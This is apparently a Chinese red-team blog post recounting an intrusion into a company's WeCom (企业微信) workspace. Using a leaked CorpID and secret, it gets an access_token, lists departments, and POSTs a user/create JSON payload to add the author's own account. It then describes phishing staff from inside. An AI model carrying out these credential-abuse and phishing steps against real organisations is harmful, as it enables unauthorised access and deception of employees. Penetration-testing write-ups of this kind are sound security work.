---
title: "记一次从企业微信到内网遨游"
date: "2021-06-21T10:26:17+08:00"
previewImage: "/images/covers/field-notes.svg"
draft: false
categories:
  - "实战记录"
tags:
  - "企业微信"
  - "红队"
  - "内网渗透"
---
##  构造请求进入企业微信

### 1.1 通过CorpID与secret获取access_token

~~~url
https://qyapi.weixin.qq.com/cgi-bin/gettoken?corpid=id&corpsecret=secrect
~~~

调用该接口，获取access_token

![image-20221021151436587](/images/legacy/image-20221021151436587.png)

### 1.2 通过acess_token获取部门ID

~~~url
https://open.work.weixin.qq.com/devtool/query?e=301002
~~~

将access_token进行输入，获取部门信息

![image-20221021151528412](/images/legacy/image-20221021151528412.png)

### 1.3 构造请求，将自己的微信号加入企业微信

将自己的微信信息POST进创建成员的URL

~~~url
https://qyapi.weixin.qq.com/cgi-bin/user/create?access_token=ACCESS_TOKEN
~~~

~~~json
{
   "userid": "masterperng",
   "name": "perng",
   "department": [partyid],
   "mobile":"1388888888"
}
~~~

![image-20230913155954481](/images/legacy/image-20230913155954481.png)

**创建成功，成功渗透进入企业微信**

![image-20221021151643413](/images/legacy/image-20221021151643413.png)

##  钓鱼咯

![image-20221021151716763](/images/legacy/image-20221021151716763.png)

**由于是在企业微信内部开展的钓鱼，成功率很高**

![image-20230913155911550](/images/legacy/image-20230913155911550.png)

